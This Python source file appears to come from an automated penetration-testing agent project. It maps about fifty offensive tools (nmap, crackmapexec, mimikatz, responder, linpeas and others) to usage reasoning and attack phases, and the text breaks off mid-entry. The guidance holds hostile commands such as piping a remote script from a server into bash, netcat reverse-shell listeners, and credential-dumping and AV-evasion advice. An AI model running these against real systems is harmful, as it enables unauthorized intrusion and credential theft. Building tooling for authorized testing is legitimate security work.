"""
Knowledge Enricher — Phase 9.3
Fills empty reasoning, description, phase, and when_to_use fields across
all knowledge base JSON files using a curated TOOL_REASONING_MAP and
rule-based inference from available context.

Usage:
    python -m data.knowledge_enricher                # Enrich all KB files
    python -m data.knowledge_enricher --file commands  # Enrich single file
    python -m data.knowledge_enricher --stats          # Show stats only

Author: Filip Volf
"""

import json
import logging
import os
import re
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Dict, List, Optional, Set, Tuple

logger = logging.getLogger("ariaska.knowledge_enricher")

KB_DIR = Path(__file__).parent / "knowledge_base"


# =============================================================================
# TOOL REASONING MAP — ~350 pentesting tool enrichment entries
# Each maps a tool_name (lowercase) to its reasoning, description, phase,
# when_to_use, related_tools, and assigned_agents.
# =============================================================================

@dataclass
class ToolReasoning:
    """Enrichment data for a specific pentesting tool."""
    reasoning: str
    description: str
    phase: str  # RECON, ENUMERATION, EXPLOITATION, etc.
    when_to_use: str
    not_when: str = ""
    related_tools: List[str] = field(default_factory=list)
    agents: List[str] = field(default_factory=list)  # red, scout, blue, shadow, orion
    tags: List[str] = field(default_factory=list)


# fmt: off
TOOL_REASONING_MAP: Dict[str, ToolReasoning] = {
    # ─── Network Scanning & Discovery ───────────────────────────────────
    "nmap": ToolReasoning(
        reasoning="The most versatile network scanner. Identifies live hosts, open ports, services, versions, and OS. Foundation of all pentesting — you can't attack what you can't see.",
        description="Network exploration and security auditing tool. Supports ping sweeps, port scans, service/version detection, OS fingerprinting, and NSE scripts.",
        phase="RECON",
        when_to_use="Always first tool in any engagement. Use -sn for host discovery, -sT/-sS for port scan, -sV for versions, --script for vulnerability checks.",
        not_when="After you already have comprehensive port/service info and need to move to exploitation.",
        related_tools=["masscan", "rustscan", "unicornscan"],
        agents=["scout", "red"],
        tags=["network", "ports", "discovery"],
    ),
    "masscan": ToolReasoning(
        reasoning="Scans the entire internet in under 6 minutes. When nmap is too slow for large ranges, masscan trades accuracy for raw speed. Follow up with nmap -sV on found ports.",
        description="TCP port scanner that uses asynchronous SYN scanning for extreme speed. Scans large networks much faster than nmap.",
        phase="RECON",
        when_to_use="Large network ranges (>256 hosts) where nmap would take too long. Use --rate to control speed. Always follow up with nmap -sV on discovered ports.",
        not_when="Small targets (single host). Less accurate than nmap. Requires root/sudo.",
        related_tools=["nmap", "rustscan"],
        agents=["scout"],
        tags=["network", "fast", "ports"],
    ),
    "rustscan": ToolReasoning(
        reasoning="Rust-based port scanner that combines masscan speed with nmap functionality. Scans all 65535 ports in seconds, then hands off to nmap for service detection.",
        description="Modern port scanner written in Rust. Discovers open ports extremely fast, then automatically pipes results to nmap for detailed scanning.",
        phase="RECON",
        when_to_use="When you want fast full port coverage with automatic nmap follow-up. Great for CTFs and time-limited engagements.",
        not_when="Stealth-required situations — very noisy.",
        related_tools=["nmap", "masscan"],
        agents=["scout"],
        tags=["network", "fast"],
    ),

    # ─── Web Discovery & Enumeration ────────────────────────────────────
    "gobuster": ToolReasoning(
        reasoning="Fast directory/file brute-forcer. Discovers hidden paths, admin panels, backup files, and API endpoints that aren't linked from the main page.",
        description="Directory/file brute-force tool using wordlists. Supports dir, dns, vhost, and fuzz modes.",
        phase="ENUMERATION",
        when_to_use="After finding HTTP/HTTPS services. Use dir mode with common wordlists (directory-list-2.3-medium.txt). Try different extensions (-x php,txt,bak).",
        not_when="No web service found. Don't brute-force with huge wordlists before trying common paths manually.",
        related_tools=["feroxbuster", "dirsearch", "ffuf", "dirb"],
        agents=["scout", "red"],
        tags=["web", "enumeration", "directories"],
    ),
    "feroxbuster": ToolReasoning(
        reasoning="Recursive directory brute-forcer. Unlike gobuster, feroxbuster automatically recurses into discovered directories, finding deeply nested paths.",
        description="Fast, recursive content discovery tool written in Rust. Automatically follows discovered directories.",
        phase="ENUMERATION",
        when_to_use="Deep web enumeration when you suspect nested directory structures. Better than gobuster for finding /admin/backup/config/ type paths.",
        not_when="Simple flat directory structures. Can be very noisy with recursion.",
        related_tools=["gobuster", "dirsearch", "ffuf"],
        agents=["scout"],
        tags=["web", "enumeration", "recursive"],
    ),
    "ffuf": ToolReasoning(
        reasoning="Fastest web fuzzer. Beyond directory discovery, ffuf can fuzz any part of an HTTP request — headers, POST data, subdomains, virtual hosts, parameters.",
        description="Fast web fuzzer written in Go. Supports directory brute-forcing, parameter discovery, virtual host enumeration, and custom fuzzing.",
        phase="ENUMERATION",
        when_to_use="When you need to fuzz beyond just directories: virtual hosts (-H 'Host: FUZZ.target'), parameters, POST data, headers. Supports filtering by size/words/lines.",
        not_when="Simple directory listing — gobuster is simpler for basic dir busting.",
        related_tools=["gobuster", "wfuzz", "dirsearch"],
        agents=["scout", "red"],
        tags=["web", "fuzzing", "enumeration"],
    ),
    "dirb": ToolReasoning(
        reasoning="Classic web content scanner. Less features than gobuster/ffuf but reliable and pre-installed on Kali. Good default choice.",
        description="Web content scanner using dictionary-based attacks. Simple and reliable directory brute-forcing.",
        phase="ENUMERATION",
        when_to_use="Quick directory scan when gobuster/ffuf aren't available. Uses common wordlists by default.",
        related_tools=["gobuster", "ffuf", "dirsearch"],
        agents=["scout"],
        tags=["web", "enumeration"],
    ),
    "dirsearch": ToolReasoning(
        reasoning="Python web path scanner with smart extensions and recursive scanning. Good default wordlists built in.",
        description="Advanced web path brute-forcer with recursive scanning, extension support, and built-in wordlists.",
        phase="ENUMERATION",
        when_to_use="Alternative to gobuster with better built-in wordlists. Good for quick scans without specifying wordlists.",
        related_tools=["gobuster", "ffuf", "feroxbuster"],
        agents=["scout"],
        tags=["web", "enumeration"],
    ),
    "nikto": ToolReasoning(
        reasoning="Web vulnerability scanner that checks for dangerous files, outdated server software, and version-specific problems. Finds things directory busters miss.",
        description="Web server scanner that tests for dangerous files/programs, outdated versions, and version-specific problems. Checks 6700+ potentially dangerous files.",
        phase="ENUMERATION",
        when_to_use="After finding a web server. Nikto finds server misconfigs, default files, and known vulns that directory brute-forcing won't find.",
        not_when="Stealth required — nikto is extremely noisy and easily detected.",
        related_tools=["nmap", "whatweb", "wpscan"],
        agents=["scout"],
        tags=["web", "vulnerability", "enumeration"],
    ),
    "whatweb": ToolReasoning(
        reasoning="Web technology fingerprinter. Identifies CMS (WordPress, Joomla), frameworks (Rails, Django), web servers, and JavaScript libraries. Directs your attack strategy.",
        description="Next-generation web scanner that identifies technologies used by websites including CMS, blogging platforms, JS libraries, and web servers.",
        phase="RECON",
        when_to_use="First tool after finding a web service. Knowing the tech stack determines your attack approach (WordPress → wpscan, PHP → LFI/RCE, Java → deserialization).",
        related_tools=["wappalyzer", "builtwith", "curl"],
        agents=["scout"],
        tags=["web", "fingerprint"],
    ),
    "wpscan": ToolReasoning(
        reasoning="WordPress-specific scanner. WordPress powers 40%+ of the web, and its plugin ecosystem is riddled with vulns. WPScan finds outdated plugins, themes, and user enumeration.",
        description="WordPress security scanner. Enumerates users, plugins, themes and checks for known vulnerabilities using the WPScan Vulnerability Database.",
        phase="ENUMERATION",
        when_to_use="When whatweb/headers reveal WordPress. Enumerate plugins (--enumerate p), users (--enumerate u), and themes (--enumerate t). Use --api-token for CVE data.",
        not_when="Target is not WordPress. Don't run on non-WordPress sites.",
        related_tools=["whatweb", "nikto", "gobuster"],
        agents=["scout", "red"],
        tags=["web", "wordpress", "cms"],
    ),
    "curl": ToolReasoning(
        reasoning="Universal HTTP client. Beyond basic requests, curl can test authentication, upload files, follow redirects, send custom headers, and interact with APIs. Essential for manual testing.",
        description="Command-line tool for transferring data with URL syntax. Supports HTTP, HTTPS, FTP, and many protocols.",
        phase="RECON",
        when_to_use="Quick header checks (-I), testing authentication, sending POST requests, downloading files, interacting with APIs. Foundation tool for web testing.",
        related_tools=["wget", "httpie", "python-requests"],
        agents=["scout", "red"],
        tags=["web", "http", "utility"],
    ),

    # ─── DNS Enumeration ────────────────────────────────────────────────
    "dig": ToolReasoning(
        reasoning="DNS query tool. Zone transfers, AXFR attempts, and record enumeration reveal subdomains, mail servers, and internal hostnames that expand your attack surface.",
        description="DNS lookup utility. Queries DNS servers for A, AAAA, MX, NS, TXT, AXFR and other record types.",
        phase="RECON",
        when_to_use="DNS enumeration: check for zone transfers (dig axfr @ns target), find subdomains, check TXT records for SPF/DKIM info.",
        related_tools=["host", "nslookup", "dnsrecon", "dnsenum"],
        agents=["scout"],
        tags=["dns", "enumeration"],
    ),
    "dnsrecon": ToolReasoning(
        reasoning="Automated DNS enumeration. Checks zone transfers, brute-forces subdomains, enumerates records, and checks for DNSSEC misconfigurations. Faster than manual dig.",
        description="DNS enumeration tool that performs standard DNS queries, zone transfer attempts, subdomain brute-forcing, and SRV record enumeration.",
        phase="RECON",
        when_to_use="Comprehensive DNS recon. Zone transfer checks, subdomain brute-forcing (-d target -D wordlist -t brt), reverse lookups.",
        related_tools=["dig", "dnsenum", "fierce", "sublist3r"],
        agents=["scout"],
        tags=["dns", "enumeration"],
    ),
    "dnsenum": ToolReasoning(
        reasoning="DNS information gathering. Combines DNS queries, zone transfers, Google scraping, and brute-forcing for comprehensive subdomain discovery.",
        description="Multithreaded DNS information gathering tool. Enumerates subdomains via zone transfers, Google, brute-force, and reverse DNS.",
        phase="RECON",
        when_to_use="Subdomain enumeration when you need to discover all hosts in a domain. Combines multiple techniques automatically.",
        related_tools=["dnsrecon", "fierce", "sublist3r"],
        agents=["scout"],
        tags=["dns", "enumeration"],
    ),

    # ─── SMB/Windows Enumeration ────────────────────────────────────────
    "enum4linux": ToolReasoning(
        reasoning="Windows/Samba enumeration via SMB/NetBIOS. Extracts user lists, share names, password policies, group memberships, and OS info. Critical for AD environments.",
        description="Tool for enumerating information from Windows and Samba systems. Extracts users, shares, groups, password policies via SMB.",
        phase="ENUMERATION",
        when_to_use="When ports 139/445 are open. Enumerates shares, users, groups, password policies. First step in SMB-based attacks.",
        not_when="No SMB ports open. For modern systems, enum4linux-ng is preferred.",
        related_tools=["smbclient", "smbmap", "crackmapexec", "enum4linux-ng"],
        agents=["scout", "red"],
        tags=["smb", "windows", "enumeration"],
    ),
    "smbclient": ToolReasoning(
        reasoning="SMB client that lets you browse and download from Windows shares. Like FTP but for SMB. Access shared files, find config files, and exfiltrate data.",
        description="Client for accessing SMB/CIFS shares. Browse, upload, download files from Windows file shares.",
        phase="ENUMERATION",
        when_to_use="After enum4linux finds accessible shares. Use -L to list shares, then connect to browse. Check for writable shares and interesting files.",
        related_tools=["smbmap", "enum4linux", "crackmapexec"],
        agents=["scout", "red"],
        tags=["smb", "file-access"],
    ),
    "smbmap": ToolReasoning(
        reasoning="SMB share permission mapper. Shows what shares you can read/write with current credentials. Critical for identifying accessible and writable shares.",
        description="SMB share enumeration tool. Lists shares with permission levels and allows recursive file listing.",
        phase="ENUMERATION",
        when_to_use="Check share permissions with current creds or null session. -H target for null session, -u user -p pass for authenticated.",
        related_tools=["smbclient", "enum4linux", "crackmapexec"],
        agents=["scout", "red"],
        tags=["smb", "permissions"],
    ),
    "crackmapexec": ToolReasoning(
        reasoning="Swiss army knife for AD pentesting. Tests credentials across SMB/WinRM/MSSQL/LDAP, executes commands, dumps SAM, and checks for specific vulns like ZeroLogon.",
        description="Post-exploitation tool for Active Directory environments. Tests credentials, executes commands, dumps credentials across multiple protocols.",
        phase="EXPLOITATION",
        when_to_use="After getting credentials — spray them across the network. Test SMB, WinRM, LDAP, MSSQL. Use --sam to dump local creds, --lsa for LSA secrets.",
        not_when="No credentials yet. Very noisy — triggers lockouts if spraying too aggressively.",
        related_tools=["evil-winrm", "impacket", "bloodhound"],
        agents=["red"],
        tags=["ad", "credentials", "lateral-movement"],
    ),
    "impacket-psexec": ToolReasoning(
        reasoning="Remote command execution via SMB. Creates a service to run commands as SYSTEM. The go-to tool for lateral movement in AD environments when you have admin creds.",
        description="Impacket's psexec.py — remote command execution via SMB using a service that runs as SYSTEM.",
        phase="EXPLOITATION",
        when_to_use="When you have admin credentials and SMB (445) is open. Gives you SYSTEM shell. Use when WinRM isn't available.",
        not_when="No admin creds. Creates event logs. AV may detect the service.",
        related_tools=["impacket-wmiexec", "impacket-smbexec", "evil-winrm"],
        agents=["red"],
        tags=["ad", "lateral-movement", "execution"],
    ),
    "impacket-secretsdump": ToolReasoning(
        reasoning="Dumps credentials remotely without touching disk. Extracts NTLM hashes, Kerberos keys, and cleartext passwords from SAM, LSA, NTDS.dit. The golden tool for credential harvesting.",
        description="Remote credential dumping — extracts password hashes from SAM database, LSA secrets, cached credentials, and NTDS.dit.",
        phase="POST_EXPLOITATION",
        when_to_use="After getting domain admin or local admin. Dump all hashes for offline cracking or pass-the-hash. On DC: dumps entire NTDS.dit.",
        related_tools=["mimikatz", "crackmapexec", "hashcat"],
        agents=["red"],
        tags=["ad", "credentials", "post-exploitation"],
    ),
    "impacket-wmiexec": ToolReasoning(
        reasoning="Stealthier than psexec — executes commands via WMI, doesn't create a service. Harder to detect but still needs admin creds.",
        description="Semi-interactive shell through WMI. Executes commands via Windows Management Instrumentation.",
        phase="EXPLOITATION",
        when_to_use="Stealthier lateral movement than psexec. When you need to avoid creating services. Same requirements: admin creds + SMB.",
        related_tools=["impacket-psexec", "impacket-smbexec", "evil-winrm"],
        agents=["red", "shadow"],
        tags=["ad", "lateral-movement", "stealth"],
    ),
    "evil-winrm": ToolReasoning(
        reasoning="WinRM shell client. When WinRM (5985/5986) is open and you have creds, evil-winrm gives you a PowerShell session with file transfer and PowerShell module loading.",
        description="Windows Remote Management (WinRM) shell. Provides PowerShell session with file upload/download and module loading.",
        phase="EXPLOITATION",
        when_to_use="When port 5985/5986 is open and you have valid credentials. Gives interactive PowerShell. Supports file transfers and PowerShell script execution.",
        not_when="WinRM not enabled. No valid credentials.",
        related_tools=["crackmapexec", "impacket-psexec", "powershell"],
        agents=["red"],
        tags=["ad", "winrm", "shell"],
    ),

    # ─── FTP/SSH/Telnet ─────────────────────────────────────────────────
    "ftp": ToolReasoning(
        reasoning="FTP is often misconfigured with anonymous login or default creds. Check for anonymous access first — many servers expose sensitive files this way.",
        description="File Transfer Protocol client. Connect to FTP servers, browse directories, upload/download files.",
        phase="ENUMERATION",
        when_to_use="When port 21 is open. Try anonymous login first (ftp anonymous@target). Check for writable directories and interesting files.",
        not_when="Port 21 not open. Prefer SFTP/SCP for secure transfers.",
        related_tools=["nmap", "hydra", "medusa"],
        agents=["scout", "red"],
        tags=["ftp", "file-access"],
    ),
    "ssh": ToolReasoning(
        reasoning="Secure shell for remote access. With valid credentials or keys, SSH gives you interactive shell access. Also used for tunneling and port forwarding.",
        description="Secure Shell client for remote login and command execution. Supports tunneling, port forwarding, and key-based authentication.",
        phase="EXPLOITATION",
        when_to_use="When you have valid credentials or SSH keys. Use -L for local port forwarding, -D for dynamic SOCKS proxy, -R for reverse tunneling.",
        related_tools=["sshpass", "ssh-keygen", "chisel"],
        agents=["red"],
        tags=["access", "tunneling"],
    ),
    "telnet": ToolReasoning(
        reasoning="Cleartext remote access protocol. Inherently insecure but still found on legacy systems and IoT devices. Also useful for manual service banner grabbing.",
        description="Telnet client for cleartext remote connections. Used for legacy systems and manual service interaction.",
        phase="EXPLOITATION",
        when_to_use="When port 23 is open (try default creds). Also useful for manual banner grabbing: telnet target 80 then type HTTP request.",
        not_when="Modern systems rarely use telnet. Credentials sent in cleartext.",
        related_tools=["ssh", "nc"],
        agents=["scout", "red"],
        tags=["legacy", "access"],
    ),

    # ─── Password Attacks ───────────────────────────────────────────────
    "hydra": ToolReasoning(
        reasoning="Online password brute-forcer supporting 50+ protocols. When you find a login form (SSH, FTP, HTTP, SMB), hydra automates credential testing. Use with good wordlists.",
        description="Fast online password cracking tool. Supports SSH, FTP, HTTP, SMB, RDP, MySQL, and many more protocols.",
        phase="EXPLOITATION",
        when_to_use="After finding a login service. Use common credential lists first (rockyou.txt, default creds). Target specific users if known.",
        not_when="Account lockout policies are in place. No login interface found. Better to try default creds manually first.",
        related_tools=["medusa", "ncrack", "patator", "hashcat"],
        agents=["red"],
        tags=["passwords", "brute-force"],
    ),
    "hashcat": ToolReasoning(
        reasoning="GPU-powered hash cracker. After dumping password hashes, hashcat uses GPU acceleration to crack them orders of magnitude faster than CPU-based tools.",
        description="Advanced password recovery tool using GPU acceleration. Supports 300+ hash types with multiple attack modes.",
        phase="POST_EXPLOITATION",
        when_to_use="After extracting hashes (SAM, NTDS.dit, /etc/shadow, web app DBs). Identify hash type first (-m flag). Use rules for efficient cracking.",
        not_when="No hashes to crack. No GPU available (use john instead).",
        related_tools=["john", "ophcrack", "impacket-secretsdump"],
        agents=["red"],
        tags=["passwords", "cracking", "offline"],
    ),
    "john": ToolReasoning(
        reasoning="John the Ripper — CPU-based password cracker. More flexible than hashcat for custom formats. Use *2john scripts to convert files to crackable format.",
        description="Password cracker supporting many formats. Includes conversion tools (ssh2john, zip2john, etc.) for various file types.",
        phase="POST_EXPLOITATION",
        when_to_use="Crack password hashes, ZIP files, SSH keys, KeePass databases. Use *2john scripts first to extract hashes from files.",
        related_tools=["hashcat", "zip2john", "ssh2john"],
        agents=["red"],
        tags=["passwords", "cracking"],
    ),
    "medusa": ToolReasoning(
        reasoning="Parallel login brute-forcer. Similar to hydra but with different protocol support and parallel capabilities.",
        description="Speedy, parallel, modular login brute-forcer. Alternative to hydra.",
        phase="EXPLOITATION",
        when_to_use="Alternative to hydra for login brute-forcing. Good for parallel attacks against multiple hosts.",
        related_tools=["hydra", "ncrack", "patator"],
        agents=["red"],
        tags=["passwords", "brute-force"],
    ),

    # ─── Exploitation Frameworks ────────────────────────────────────────
    "msfconsole": ToolReasoning(
        reasoning="Metasploit Framework console. The most comprehensive exploitation framework with 2000+ exploits, 600+ payloads, and post-exploitation modules. Essential for known CVE exploitation.",
        description="Metasploit Framework interactive console. Search exploits, configure payloads, exploit vulnerabilities, and perform post-exploitation.",
        phase="EXPLOITATION",
        when_to_use="When you have identified specific CVEs or vulnerable service versions. search <cve/service>, use <module>, set RHOSTS, exploit.",
        related_tools=["searchsploit", "msfvenom", "meterpreter"],
        agents=["red"],
        tags=["exploitation", "framework"],
    ),
    "msfvenom": ToolReasoning(
        reasoning="Payload generator. Creates reverse shells, bind shells, and staged/stageless payloads for any platform. Supports encoding to evade basic AV.",
        description="Metasploit payload generator. Creates shellcode, executables, and scripts for various platforms with optional encoding.",
        phase="EXPLOITATION",
        when_to_use="Generate payloads for exploitation: reverse shells (windows/meterpreter/reverse_tcp), web shells (php/reverse_php), shellcode for buffer overflows.",
        related_tools=["msfconsole", "venom", "shellter"],
        agents=["red"],
        tags=["payloads", "shellcode"],
    ),
    "searchsploit": ToolReasoning(
        reasoning="Local ExploitDB search. After identifying service versions with nmap -sV, searchsploit finds known exploits instantly without internet access.",
        description="Command-line search tool for Exploit-DB. Searches local copy of ExploitDB for exploits matching service/version.",
        phase="ENUMERATION",
        when_to_use="After nmap -sV reveals service versions. searchsploit <service> <version> to find matching exploits. Use -m to mirror exploit code.",
        related_tools=["msfconsole", "nmap"],
        agents=["scout", "red"],
        tags=["exploit-search", "enumeration"],
    ),

    # ─── Web Application Attacks ────────────────────────────────────────
    "sqlmap": ToolReasoning(
        reasoning="Automated SQL injection tool. Detects and exploits SQL injection flaws to dump databases, read files, get OS shells. Handles blind/time-based/union-based/stacked queries.",
        description="Automatic SQL injection and database takeover tool. Detects and exploits SQL injection vulnerabilities with database fingerprinting and data extraction.",
        phase="EXPLOITATION",
        when_to_use="When you suspect SQL injection. Test with sqlmap -u 'url?param=value' --batch --dbs. Use --level 5 --risk 3 for thorough testing.",
        not_when="No user input reflected in database queries. WAF may block automated testing.",
        related_tools=["burpsuite", "commix"],
        agents=["red"],
        tags=["web", "sqli", "database"],
    ),
    "burpsuite": ToolReasoning(
        reasoning="Web application proxy and scanner. Intercepts HTTP traffic to understand application behavior, find injection points, and test vulnerabilities manually.",
        description="Web application security testing platform. Proxy, scanner, intruder, repeater for comprehensive web testing.",
        phase="ENUMERATION",
        when_to_use="Manual web application testing. Intercept requests, modify parameters, test authentication, fuzz inputs. Essential for complex web apps.",
        related_tools=["zap", "mitmproxy", "sqlmap"],
        agents=["red"],
        tags=["web", "proxy", "testing"],
    ),
    "commix": ToolReasoning(
        reasoning="Automated command injection tool. When a web app passes user input to system commands, commix finds and exploits the injection to get OS command execution.",
        description="Automated OS command injection and exploitation tool. Detects and exploits command injection vulnerabilities.",
        phase="EXPLOITATION",
        when_to_use="Web forms that might pass input to system commands (ping, traceroute, DNS lookup forms). Test with commix -u 'url?param=value'.",
        related_tools=["sqlmap", "burpsuite"],
        agents=["red"],
        tags=["web", "command-injection"],
    ),
    "xsstrike": ToolReasoning(
        reasoning="Advanced XSS detection. Fuzzes parameters with context-aware payloads that bypass WAFs and filters. More sophisticated than manual XSS testing.",
        description="Advanced XSS detection suite with fuzzing engine, context analysis, and WAF bypass capabilities.",
        phase="EXPLOITATION",
        when_to_use="When testing for reflected/stored XSS. Use after identifying input fields reflected in output. Tests filter bypasses automatically.",
        related_tools=["dalfox", "burpsuite"],
        agents=["red"],
        tags=["web", "xss"],
    ),

    # ─── Reverse Shells & Listeners ─────────────────────────────────────
    "nc": ToolReasoning(
        reasoning="Swiss army knife of networking. Listener for reverse shells, port scanning, file transfer, and manual protocol interaction. Every pentester's essential tool.",
        description="Netcat — TCP/UDP connection utility. Creates listeners, reverse shells, port scans, file transfers.",
        phase="EXPLOITATION",
        when_to_use="Set up listener for reverse shells (nc -lvnp 4444). Also useful for port scanning, banner grabbing, and file transfers.",
        related_tools=["ncat", "socat", "pwncat"],
        agents=["red"],
        tags=["networking", "shells", "utility"],
    ),
    "netcat": ToolReasoning(
        reasoning="Alias for nc (netcat). TCP/UDP utility for listeners, shells, file transfers, and manual service interaction.",
        description="Netcat — the networking Swiss army knife. TCP/UDP connections, listeners, and data relay.",
        phase="EXPLOITATION",
        when_to_use="Same as nc. Set up reverse shell listeners, transfer files, interact with services manually.",
        related_tools=["nc", "socat", "ncat"],
        agents=["red"],
        tags=["networking", "shells"],
    ),
    "socat": ToolReasoning(
        reasoning="Enhanced netcat with encryption, port forwarding, and protocol conversion. Socat can create encrypted reverse shells, relay connections, and bridge protocols.",
        description="Multipurpose relay tool. Advanced netcat replacement with SSL/TLS support, protocol bridging, and connection relaying.",
        phase="EXPLOITATION",
        when_to_use="When you need encrypted reverse shells, port forwarding through networks, or protocol bridging. More powerful than nc for complex scenarios.",
        related_tools=["nc", "chisel", "pwncat"],
        agents=["red"],
        tags=["networking", "shells", "tunneling"],
    ),
    "pwncat": ToolReasoning(
        reasoning="Sophisticated reverse shell handler. Auto-upgrades shells, manages file transfers, and has built-in enumeration and persistence modules.",
        description="Post-exploitation handler for reverse shells. Automatic shell upgrade, file transfer, enumeration, and persistence.",
        phase="POST_EXPLOITATION",
        when_to_use="Use instead of raw nc listener. Automatically upgrades dumb shells to fully interactive PTY. Built-in upload/download and persistence.",
        related_tools=["nc", "socat", "metasploit"],
        agents=["red"],
        tags=["shells", "post-exploitation"],
    ),

    # ─── Privilege Escalation ───────────────────────────────────────────
    "linpeas": ToolReasoning(
        reasoning="Linux Privilege Escalation Awesome Script. Automated enumeration that finds SUID binaries, writable paths, cron jobs, kernel vulns, and misconfigurations for privesc.",
        description="Linux privilege escalation enumeration script. Checks 100+ vectors including SUID, cron, capabilities, writable paths, kernel, and service misconfigs.",
        phase="PRIVILEGE_ESCALATION",
        when_to_use="First thing after getting a shell on Linux. Upload and run: curl <server>/linpeas.sh | bash. Review output for highlighted findings.",
        related_tools=["linenum", "linux-exploit-suggester", "pspy"],
        agents=["red"],
        tags=["privesc", "linux", "enumeration"],
    ),
    "winpeas": ToolReasoning(
        reasoning="Windows Privilege Escalation Awesome Script. Checks services, scheduled tasks, AlwaysInstallElevated, stored credentials, and token impersonation opportunities.",
        description="Windows privilege escalation enumeration tool. Checks registry, services, credentials, tokens, and misconfigurations.",
        phase="PRIVILEGE_ESCALATION",
        when_to_use="First thing after getting a shell on Windows. Transfer and run winPEASx64.exe. Look for highlighted findings.",
        related_tools=["powerview", "seatbelt", "sharpup"],
        agents=["red"],
        tags=["privesc", "windows", "enumeration"],
    ),
    "linenum": ToolReasoning(
        reasoning="Linux enumeration script. Simpler than linpeas but thorough. Checks SUID, cron, network, users, and writable files for privilege escalation.",
        description="Linux enumeration and privilege escalation checking script. Checks system info, SUID files, cron jobs, and writable paths.",
        phase="PRIVILEGE_ESCALATION",
        when_to_use="Alternative to linpeas for Linux privesc enumeration. Simpler output, good for quick checks.",
        related_tools=["linpeas", "linux-exploit-suggester"],
        agents=["red"],
        tags=["privesc", "linux"],
    ),
    "linux-exploit-suggester": ToolReasoning(
        reasoning="Suggests kernel exploits based on kernel version. After uname -a, this tool matches against known kernel CVEs for privilege escalation.",
        description="Suggests privilege escalation exploits based on the Linux kernel version and system configuration.",
        phase="PRIVILEGE_ESCALATION",
        when_to_use="After getting shell and running uname -a. Maps kernel version to known CVEs (DirtyPipe, DirtyCow, etc.).",
        related_tools=["linpeas", "kernel-exploits"],
        agents=["red"],
        tags=["privesc", "linux", "kernel"],
    ),
    "pspy": ToolReasoning(
        reasoning="Process snooper without root. Monitors cron jobs and processes that run as root. Finds scheduled tasks that may be exploitable for privesc.",
        description="Linux process monitor that detects cron jobs, scheduled tasks, and processes without requiring root privileges.",
        phase="PRIVILEGE_ESCALATION",
        when_to_use="Upload and run on target. Watch for cron jobs running as root with writable scripts or vulnerable commands.",
        related_tools=["linpeas", "crontab"],
        agents=["red"],
        tags=["privesc", "linux", "monitoring"],
    ),

    # ─── Active Directory ───────────────────────────────────────────────
    "bloodhound": ToolReasoning(
        reasoning="Active Directory relationship graphing. BloodHound reveals attack paths from your current user to Domain Admin by mapping group memberships, ACLs, sessions, and trusts.",
        description="Active Directory attack path visualization tool. Maps relationships between users, groups, computers, and identifies paths to high-value targets.",
        phase="ENUMERATION",
        when_to_use="After getting any domain credentials. Run SharpHound collector, import data, then query for shortest paths to Domain Admin.",
        related_tools=["sharphound", "powerview", "crackmapexec"],
        agents=["red", "scout"],
        tags=["ad", "enumeration", "graphing"],
    ),
    "sharphound": ToolReasoning(
        reasoning="BloodHound data collector. Runs on target to gather AD information: users, groups, sessions, ACLs, GPOs, trusts. Essential for BloodHound analysis.",
        description="BloodHound data collector for Active Directory. Gathers user/group/ACL/session/trust data for graph analysis.",
        phase="ENUMERATION",
        when_to_use="After getting domain credentials. Run on target: SharpHound.exe -c All. Import resulting JSON into BloodHound.",
        related_tools=["bloodhound", "powerview"],
        agents=["red"],
        tags=["ad", "enumeration"],
    ),
    "powerview": ToolReasoning(
        reasoning="PowerShell AD enumeration. Get-DomainUser, Get-DomainGroup, Find-LocalAdminAccess — maps AD without BloodHound. Scriptable and flexible.",
        description="PowerShell tool for Active Directory enumeration. Queries users, groups, ACLs, GPOs, trusts, and finds attack opportunities.",
        phase="ENUMERATION",
        when_to_use="AD enumeration from a domain-joined machine. Find-LocalAdminAccess, Get-DomainUser, Invoke-ACLScanner for privilege escalation paths.",
        related_tools=["bloodhound", "sharphound", "crackmapexec"],
        agents=["red"],
        tags=["ad", "enumeration", "powershell"],
    ),
    "mimikatz": ToolReasoning(
        reasoning="Windows credential extraction. Dumps cleartext passwords, NTLM hashes, Kerberos tickets from memory. Golden/Silver ticket attacks for persistence.",
        description="Windows credential extraction tool. Dumps passwords, hashes, tickets from LSASS, SAM, and AD. Supports pass-the-hash, golden tickets, DCSync.",
        phase="POST_EXPLOITATION",
        when_to_use="After getting admin/SYSTEM on Windows. sekurlsa::logonpasswords for creds, lsadump::dcsync for domain hashes, kerberos::golden for persistence.",
        not_when="AV/EDR will likely detect mimikatz. Use alternatives like pypykatz or comsvcs.dll MiniDump first.",
        related_tools=["impacket-secretsdump", "rubeus", "pypykatz"],
        agents=["red"],
        tags=["ad", "credentials", "post-exploitation"],
    ),
    "rubeus": ToolReasoning(
        reasoning="Kerberos attack toolkit. Kerberoasting, AS-REP roasting, S4U delegation abuse, ticket forging. The Kerberos equivalent of mimikatz.",
        description="C# tool for Kerberos interaction and abuse. Kerberoasting, AS-REP roasting, ticket requests, delegation attacks.",
        phase="EXPLOITATION",
        when_to_use="AD with Kerberos. Rubeus kerberoast to get service ticket hashes for offline cracking. asreproast for accounts without pre-auth.",
        related_tools=["impacket-getTGT", "mimikatz", "hashcat"],
        agents=["red"],
        tags=["ad", "kerberos", "credentials"],
    ),
    "responder": ToolReasoning(
        reasoning="LLMNR/NBT-NS/MDNS poisoner. Sits on the network and responds to broadcast name resolution requests, capturing NTLMv2 hashes for offline cracking.",
        description="LLMNR/NBT-NS/MDNS poisoner for credential capture. Responds to broadcast requests and captures NTLMv2 hashes.",
        phase="EXPLOITATION",
        when_to_use="On internal network. Run and wait for hosts to make broadcast requests. Captures NTLMv2 hashes that can be cracked or relayed.",
        not_when="External engagement. Only works on local network segment.",
        related_tools=["ntlmrelayx", "hashcat", "mitm6"],
        agents=["red"],
        tags=["ad", "credentials", "mitm"],
    ),
    "ntlmrelayx": ToolReasoning(
        reasoning="Relays captured NTLM authentication to other services. Instead of cracking hashes, relay them to SMB, LDAP, HTTP to authenticate as the victim.",
        description="NTLM relay attack tool. Relays captured authentication to other targets for unauthorized access.",
        phase="EXPLOITATION",
        when_to_use="After setting up responder or mitm6. Relay captured auth to targets without SMB signing. Can create new AD users, dump SAM, execute commands.",
        related_tools=["responder", "mitm6", "impacket"],
        agents=["red"],
        tags=["ad", "relay", "lateral-movement"],
    ),

    # ─── Post-Exploitation & Pivoting ───────────────────────────────────
    "chisel": ToolReasoning(
        reasoning="HTTP-based tunneling. When SSH tunneling isn't possible, chisel creates TCP tunnels over HTTP/HTTPS. Essential for pivoting through firewall-restricted networks.",
